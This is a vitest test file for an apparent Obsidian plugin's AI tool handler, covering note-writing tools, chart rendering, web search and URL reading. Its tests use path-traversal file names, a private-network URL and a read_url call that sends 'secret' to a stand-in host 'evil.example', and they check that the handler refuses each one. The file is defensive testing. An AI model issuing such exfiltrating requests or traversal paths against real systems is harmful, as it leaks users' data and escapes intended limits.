import { describe, it, expect, vi } from "vitest";

// Mock the NoteWriter module to prevent its obsidian import from failing
// in the test environment. ToolHandler receives an injected writer, so
// the mock class body is irrelevant — we never instantiate it in these tests.
vi.mock("../services/NoteWriter", () => ({ NoteWriter: class {} }));

import { getToolDefinitions, ToolHandler } from "../services/ToolHandler";
import { parseNoteWrite } from "../services/noteWrites";
import {
	acceptChartCall, CHART_TOOL_OK, CHART_TOOL_UNPLACED, type PendingChartBlock,
} from "../services/chartSpec";
import { CHART_BLOCK_SCHEMA } from "../services/promptConstants";
import type { NoteWriter } from "../services/NoteWriter";
import { WebReadScope } from "../services/webReadScope";
import type { WebSearchService } from "../services/WebSearchService";
import type { Conversation, ToolCall } from "../models/types";

// ── Minimal mock writer ───────────────────────────────────────────────────────

const makeWriter = (overrides?: { writeNote?: () => Promise<{ path: string }>; createNote?: () => Promise<{ path: string }>; prependWithSeparator?: () => Promise<{ path: string }> }): NoteWriter => ({
	writeNote:           vi.fn().mockResolvedValue({ path: "Notes/out.md" }),
	createNote:          vi.fn().mockResolvedValue({ path: "Notes/out.md" }),
	prependWithSeparator: vi.fn().mockResolvedValue({ path: "Notes/out.md" }),
	...overrides,
} as unknown as NoteWriter);

const makeHandler = (overrides?: Parameters<typeof makeWriter>[0]) =>
	new ToolHandler(makeWriter(overrides));

const call = (name: string, input: Record<string, unknown>): ToolCall => ({
	id: "test-id",
	name,
	input,
});

// ── getToolDefinitions ────────────────────────────────────────────────────────

/** The tools writeMode actually gates. The two read-only ones — web_search and
 *  render_chart — are gated on other things, or on nothing, so a test about
 *  write modes has to say which tools it means. */
const noteTools = (...args: Parameters<typeof getToolDefinitions>): string[] =>
	getToolDefinitions(...args).map((d) => d.name).filter((n) => n !== "web_search" && n !== "render_chart");

describe("getToolDefinitions", () => {
	it("offers no note tool for write mode 'none'", () => {
		expect(noteTools("Scratch", "none")).toEqual([]);
	});

	it("returns only create_note for write mode 'create'", () => {
		expect(noteTools("Scratch", "create")).toEqual(["create_note"]);
	});

	it("returns only prepend_note for write mode 'update'", () => {
		expect(noteTools("Scratch", "update")).toEqual(["prepend_note"]);
	});

	it("returns only rewrite_note for write mode 'rewrite'", () => {
		expect(noteTools("Scratch", "rewrite")).toEqual(["rewrite_note"]);
	});

	it("returns all three note tools for write mode 'all' (default)", () => {
		expect(noteTools("Scratch")).toEqual(["create_note", "prepend_note", "rewrite_note"]);
	});

	it("embeds the default folder in the create_note description", () => {
		const def = getToolDefinitions("My Notes", "create").find((d) => d.name === "create_note");
		expect(def?.description).toContain("My Notes");
	});

	it("each note definition has required path and content in its input schema", () => {
		for (const def of getToolDefinitions("Scratch")) {
			if (def.name === "render_chart" || def.name === "web_search") continue;
			expect((def.inputSchema as { required: string[] }).required).toContain("path");
			expect((def.inputSchema as { required: string[] }).required).toContain("content");
		}
	});
});

// ── render_chart gating (ADR-210) ─────────────────────────────────────────────

describe("getToolDefinitions — render_chart", () => {
	// It writes nothing at all, so it is gated on neither writeMode nor research:
	// it has to reach a comparison run and a conversation with research off.
	it("is offered in every write mode, with or without research", () => {
		for (const mode of ["none", "create", "update", "rewrite", "all"] as const) {
			for (const research of [false, true]) {
				expect(getToolDefinitions("Scratch", mode, research).map((d) => d.name))
					.toContain("render_chart");
			}
		}
	});

	it("asks for the three fields a chart cannot be drawn without", () => {
		const def = getToolDefinitions("Scratch").find((d) => d.name === "render_chart");
		const required = (def?.inputSchema as { required: string[] }).required;
		expect(required).toEqual(["type", "categories", "series"]);
	});

	// One statement of the format, shared with the standing prompt rule.
	it("describes the format once, from promptConstants", () => {
		const def = getToolDefinitions("Scratch").find((d) => d.name === "render_chart");
		expect(def?.description).toContain(CHART_BLOCK_SCHEMA);
	});
});

describe("ToolHandler — render_chart", () => {
	// Reaching execute means nobody intercepted the call, so nobody can place the
	// block. Never reported as a success: a model told "drawn" when nothing was
	// drawn writes its answer around a chart that is not there.
	it("does not claim a chart was drawn when it could not place one", async () => {
		const result = await makeHandler().execute(call("render_chart", {
			type: "bar", categories: ["a", "b"], series: [{ name: "s", values: [1, 2] }],
		}));
		expect(result).toBe(CHART_TOOL_UNPLACED);
		expect(result.startsWith("Error")).toBe(true);
	});

	it("gives the validator's reason for a bad spec, and never throws", async () => {
		const result = await makeHandler().execute(call("render_chart", {
			type: "bar", categories: ["a", "b"], series: [{ name: "s", values: [1] }],
		}));
		expect(result).toContain("series[0].values");
	});

	it("is allowed in every write mode", () => {
		for (const mode of ["none", "create", "update", "rewrite", "all"] as const) {
			expect(ToolHandler.allowedToolNames(mode).has("render_chart")).toBe(true);
		}
	});
});

// ── acceptChartCall — the one place a tool call becomes a chart ───────────────

describe("acceptChartCall", () => {
	const good = { type: "bar", categories: ["a", "b"], series: [{ name: "s", values: [1, 2] }] };

	it("records the block at the offset it was called at", () => {
		const into: PendingChartBlock[] = [];
		expect(acceptChartCall(good, 42, into)).toBe(CHART_TOOL_OK);
		expect(into).toHaveLength(1);
		expect(into[0].offset).toBe(42);
		expect(into[0].block).toContain("```pythia-chart");
	});

	// The instruction that matters: the numbers are drawn now.
	it("tells the model not to write the numbers out as well", () => {
		expect(CHART_TOOL_OK).toContain("Do not repeat these numbers");
	});

	it("records nothing for a spec it rejects", () => {
		const into: PendingChartBlock[] = [];
		const result = acceptChartCall({ type: "donut" }, 0, into);
		expect(result.startsWith("Error")).toBe(true);
		expect(into).toEqual([]);
	});

	it("never throws, whatever it is handed", () => {
		for (const input of [null, undefined, 7, "bar", []]) {
			expect(() => acceptChartCall(input, 0, [])).not.toThrow();
		}
	});
});

// ── ToolHandler — input validation ───────────────────────────────────────────

describe("ToolHandler — input validation", () => {
	it("rejects a missing path", async () => {
		const result = await makeHandler().execute(call("create_note", { content: "body" }));
		expect(result).toMatch(/path.*non-empty/i);
	});

	it("rejects an empty path string", async () => {
		const result = await makeHandler().execute(call("create_note", { path: "  ", content: "body" }));
		expect(result).toMatch(/path.*non-empty/i);
	});

	it("rejects a non-string content value", async () => {
		const result = await makeHandler().execute(call("create_note", { path: "Notes/x.md", content: 42 }));
		expect(result).toMatch(/content.*string/i);
	});

	it("rejects a path that does not end with .md", async () => {
		const result = await makeHandler().execute(call("create_note", { path: "Notes/x.txt", content: "body" }));
		expect(result).toMatch(/\.md/);
	});
});

// ── ToolHandler — create_note ─────────────────────────────────────────────────

describe("ToolHandler — create_note", () => {
	it("calls writer.createNote (never the overwriting writeNote) with the correct arguments", async () => {
		const writer = makeWriter();
		await new ToolHandler(writer).execute(call("create_note", { path: "Notes/new.md", content: "# Title" }));
		expect(writer.createNote).toHaveBeenCalledWith("# Title", "Notes/new.md");
		expect(writer.writeNote).not.toHaveBeenCalled();
	});

	it("reports an existing note as a recoverable error", async () => {
		const result = await makeHandler({ createNote: vi.fn().mockRejectedValue(new Error('A note already exists at "Notes/x.md".')) })
			.execute(call("create_note", { path: "Notes/x.md", content: "body" }));
		expect(result).toMatch(/^Error writing note: A note already exists/);
	});

	it("returns a success message containing the written path", async () => {
		const result = await makeHandler().execute(call("create_note", { path: "Notes/new.md", content: "body" }));
		expect(result).toContain("Notes/out.md");
	});

	it("returns an error string when writeNote throws", async () => {
		const result = await makeHandler({ createNote: vi.fn().mockRejectedValue(new Error("disk full")) })
			.execute(call("create_note", { path: "Notes/x.md", content: "body" }));
		expect(result).toMatch(/error writing note.*disk full/i);
	});
});

// ── ToolHandler — rewrite_note ────────────────────────────────────────────────

describe("ToolHandler — rewrite_note", () => {
	it("calls writer.writeNote (same as create_note)", async () => {
		const writer = makeWriter();
		await new ToolHandler(writer).execute(call("rewrite_note", { path: "Notes/existing.md", content: "updated" }));
		expect(writer.writeNote).toHaveBeenCalledWith("updated", "Notes/existing.md");
	});

	it("returns a success message", async () => {
		const result = await makeHandler().execute(call("rewrite_note", { path: "Notes/x.md", content: "body" }));
		expect(result).toMatch(/Note written/);
	});

	it("tells the model to name the note as a link it can open (ADR-218)", async () => {
		const result = await makeHandler().execute(call("rewrite_note", { path: "Notes/x.md", content: "body" }));
		// The path the vault reported, not the one the model asked for.
		expect(parseNoteWrite("rewrite_note", result)).toEqual({ path: "Notes/out.md", action: "rewritten" });
		expect(result).toContain("[[Notes/out|out]]");
	});
});

// ── ToolHandler — prepend_note ────────────────────────────────────────────────

describe("ToolHandler — prepend_note", () => {
	it("calls writer.prependWithSeparator with the correct arguments", async () => {
		const writer = makeWriter();
		await new ToolHandler(writer).execute(call("prepend_note", { path: "Notes/doc.md", content: "prefix" }));
		expect(writer.prependWithSeparator).toHaveBeenCalledWith("prefix", "Notes/doc.md");
	});

	it("returns a success message containing the updated path", async () => {
		const result = await makeHandler().execute(call("prepend_note", { path: "Notes/doc.md", content: "prefix" }));
		expect(result).toContain("Notes/out.md");
	});

	it("returns an error string when prependWithSeparator throws", async () => {
		const result = await makeHandler({ prependWithSeparator: vi.fn().mockRejectedValue(new Error("locked")) })
			.execute(call("prepend_note", { path: "Notes/doc.md", content: "prefix" }));
		expect(result).toMatch(/error updating note.*locked/i);
	});
});

// ── ToolHandler — path safety & context-note allow-list ───────────────────────

describe("ToolHandler — path safety", () => {
	it("rejects a path with traversal segments before writing", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("create_note", { path: "../../evil.md", content: "x" }),
		);
		expect(result).toMatch(/traversal/i);
		expect(writer.writeNote).not.toHaveBeenCalled();
	});

	it("rejects a backslash traversal segment", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("rewrite_note", { path: "notes\\..\\secret.md", content: "x" }),
		);
		expect(result).toMatch(/traversal/i);
		expect(writer.writeNote).not.toHaveBeenCalled();
	});
});

describe("ToolHandler — context-note allow-list", () => {
	const ctx = ["Notes/allowed.md"];

	it("blocks rewrite_note targeting a note outside the context set", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("rewrite_note", { path: "Notes/other.md", content: "x" }),
			undefined,
			ctx,
		);
		expect(result).toMatch(/not in context notes/i);
		expect(writer.writeNote).not.toHaveBeenCalled();
	});

	it("blocks prepend_note targeting a note outside the context set", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("prepend_note", { path: "Notes/other.md", content: "x" }),
			undefined,
			ctx,
		);
		expect(result).toMatch(/not in context notes/i);
		expect(writer.prependWithSeparator).not.toHaveBeenCalled();
	});

	it("allows rewrite_note when the path is in the context set", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("rewrite_note", { path: "Notes/allowed.md", content: "x" }),
			undefined,
			ctx,
		);
		expect(result).toMatch(/Note written/);
		expect(writer.writeNote).toHaveBeenCalledWith("x", "Notes/allowed.md");
	});

	it("does not constrain create_note to the context set", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("create_note", { path: "Notes/brand-new.md", content: "x" }),
			undefined,
			ctx,
		);
		expect(result).toMatch(/Note written/);
		expect(writer.createNote).toHaveBeenCalledWith("x", "Notes/brand-new.md");
	});

	it("does not enforce the allow-list when no context set is passed (back-compat)", async () => {
		const writer = makeWriter();
		const result = await new ToolHandler(writer).execute(
			call("rewrite_note", { path: "Notes/anything.md", content: "x" }),
		);
		expect(result).toMatch(/Note written/);
	});
});

// ── ToolHandler — unknown tool ────────────────────────────────────────────────

describe("ToolHandler — unknown tool", () => {
	it("returns an error for an unrecognised tool name", async () => {
		const result = await makeHandler().execute(call("delete_note", { path: "Notes/x.md", content: "" }));
		expect(result).toMatch(/unknown tool.*delete_note/i);
	});
});

// ── web_search gating ─────────────────────────────────────────────────────────

describe("getToolDefinitions — web_search research gating", () => {
	it("does not include web_search when research is disabled (default)", () => {
		const names = getToolDefinitions("Scratch", "all").map((d) => d.name);
		expect(names).not.toContain("web_search");
	});

	it("appends web_search when research is enabled, for every write mode", () => {
		for (const mode of ["none", "create", "update", "rewrite", "all"] as const) {
			const names = getToolDefinitions("Scratch", mode, true).map((d) => d.name);
			expect(names).toContain("web_search");
		}
	});

	it("exposes web_search even when writeMode is 'none'", () => {
		const defs = getToolDefinitions("Scratch", "none", true);
		// Only the read-only tools: no note tool is offered in this mode.
		expect(defs.map((d) => d.name)).toEqual(["web_search", "read_url", "render_chart"]);
		expect((defs[0].inputSchema as { required: string[] }).required).toContain("query");
	});
});

describe("ToolHandler.allowedToolNames — research", () => {
	it("omits web_search unless research is enabled", () => {
		expect(ToolHandler.allowedToolNames("all").has("web_search")).toBe(false);
		expect(ToolHandler.allowedToolNames("all", true).has("web_search")).toBe(true);
		expect(ToolHandler.allowedToolNames("none", true).has("web_search")).toBe(true);
	});

	it("gates read_url exactly like web_search — same outbound call, same opt-in", () => {
		expect(getToolDefinitions("Scratch", "all").map((d) => d.name)).not.toContain("read_url");
		expect(ToolHandler.allowedToolNames("all").has("read_url")).toBe(false);
		for (const mode of ["none", "create", "update", "rewrite", "all"] as const) {
			expect(getToolDefinitions("Scratch", mode, true).map((d) => d.name)).toContain("read_url");
			expect(ToolHandler.allowedToolNames(mode, true).has("read_url")).toBe(true);
		}
	});
});

// ── ToolHandler — web_search execution ────────────────────────────────────────

const makeSearch = (result = "web results"): WebSearchService =>
	({ search: vi.fn().mockResolvedValue(result) } as unknown as WebSearchService);

describe("ToolHandler — web_search", () => {
	it("routes to the search service and returns its string result", async () => {
		const search = makeSearch("Summary: X");
		const handler = new ToolHandler(makeWriter(), search);
		const result = await handler.execute(
			call("web_search", { query: "latest news" }),
			new Set(["web_search"])
		);
		expect(search.search).toHaveBeenCalledWith({ query: "latest news" });
		expect(result).toBe("Summary: X");
	});

	it("rejects a missing/empty query before calling the service", async () => {
		const search = makeSearch();
		const handler = new ToolHandler(makeWriter(), search);
		const result = await handler.execute(call("web_search", { query: "  " }), new Set(["web_search"]));
		expect(result).toMatch(/query.*non-empty/i);
		expect(search.search).not.toHaveBeenCalled();
	});

	it("returns an error when no search service is wired", async () => {
		const result = await makeHandler().execute(
			call("web_search", { query: "q" }),
			new Set(["web_search"])
		);
		expect(result).toMatch(/web search is not available/i);
	});

	it("is blocked when web_search is not in the allowed set", async () => {
		const search = makeSearch();
		const handler = new ToolHandler(makeWriter(), search);
		const result = await handler.execute(call("web_search", { query: "q" }), new Set(["create_note"]));
		expect(result).toMatch(/not allowed/i);
		expect(search.search).not.toHaveBeenCalled();
	});
});

describe("ToolHandler — web_search filters and read_url (ADR-217)", () => {
	it("passes validated filters to the service", async () => {
		const search = makeSearch();
		await new ToolHandler(makeWriter(), search).execute(
			call("web_search", { query: "q", topic: "news", include_domains: ["https://www.x.com/"] }),
			new Set(["web_search"])
		);
		expect(search.search).toHaveBeenCalledWith({ query: "q", topic: "news", includeDomains: ["x.com"] });
	});

	it("returns the validator's reason for a bad filter, without calling the service", async () => {
		const search = makeSearch();
		const result = await new ToolHandler(makeWriter(), search).execute(
			call("web_search", { query: "q", time_range: "hour" }),
			new Set(["web_search"])
		);
		expect(result).toMatch(/^Error: 'time_range'/);
		expect(search.search).not.toHaveBeenCalled();
	});

	it("routes read_url to extract, and refuses a private address before any request", async () => {
		const extract = vi.fn().mockResolvedValue("page");
		const svc = { extract } as unknown as WebSearchService;
		const handler = new ToolHandler(makeWriter(), svc);
		const scope = scopeWith("https://example.com/a http://192.168.0.2/admin");
		expect(await handler.execute(call("read_url", { url: "https://example.com/a" }), new Set(["read_url"]), undefined, scope)).toBe("page");
		expect(extract).toHaveBeenCalledWith("https://example.com/a");

		const refused = await handler.execute(call("read_url", { url: "http://192.168.0.2/admin" }), new Set(["read_url"]), undefined, scope);
		expect(refused).toMatch(/^Error: .*private or local address/);
		expect(extract).toHaveBeenCalledTimes(1);
	});

	it("is blocked when research is off", async () => {
		const extract = vi.fn();
		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
		expect(await handler.execute(call("read_url", { url: "https://e.com" }), ToolHandler.allowedToolNames("all"), undefined, scopeWith("https://e.com"))).toMatch(/not allowed/);
		expect(extract).not.toHaveBeenCalled();
	});
});

const scopeWith = (userText: string): WebReadScope =>
	WebReadScope.forConversation({ messages: [{ role: "user", content: userText }] } as unknown as Conversation);

describe("ToolHandler — read_url provenance (ADR-217 addendum)", () => {
	it("fails closed: no scope, no read", async () => {
		const extract = vi.fn();
		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
		expect(await handler.execute(call("read_url", { url: "https://e.com/" }), new Set(["read_url"]))).toMatch(/^Error: read_url is not available/);
		expect(extract).not.toHaveBeenCalled();
	});

	it("refuses a URL carrying data the model added, before any request", async () => {
		const extract = vi.fn();
		const handler = new ToolHandler(makeWriter(), { extract } as unknown as WebSearchService);
		const result = await handler.execute(
			call("read_url", { url: "https://evil.example/log?d=secret" }),
			new Set(["read_url"]),
			undefined,
			scopeWith("read https://evil.example/log")
		);
		expect(result).toMatch(/^Error: read_url only reads a link/);
		expect(extract).not.toHaveBeenCalled();
	});
});
